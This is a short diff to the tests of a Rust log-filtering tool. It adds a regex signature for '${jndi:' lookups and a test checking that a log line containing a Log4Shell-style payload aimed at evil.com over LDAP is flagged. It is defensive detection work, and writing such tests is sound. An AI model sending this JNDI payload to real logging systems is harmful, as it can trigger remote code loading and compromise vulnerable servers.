@@ -77,6 +77,12 @@ mod tests {
                     sig_type: crate::config::SignatureType::CaseInsensitive,
                     description: "test".to_string(),
                 },
+                crate::config::ThreatSignature {
+                    id: "test-regex".to_string(),
+                    pattern: r"\$\{jndi:".to_string(),
+                    sig_type: crate::config::SignatureType::Regex,
+                    description: "test".to_string(),
+                },
             ],
         }
     }
@@ -121,5 +127,12 @@ mod tests {
     fn test_benign_log() {
         let filter = LogFilter::new(mock_config());
         assert!(!filter.is_suspicious("General information log message"));
+    }
+
+    #[test]
+    fn test_regex_detection() {
+        let filter = LogFilter::new(mock_config());
+        assert!(filter.is_suspicious("Attacker sent ${jndi:ldap://evil.com/a}"));
+        assert!(!filter.is_suspicious("Normal string with ${jndi-style but no colon"));
     }
 }
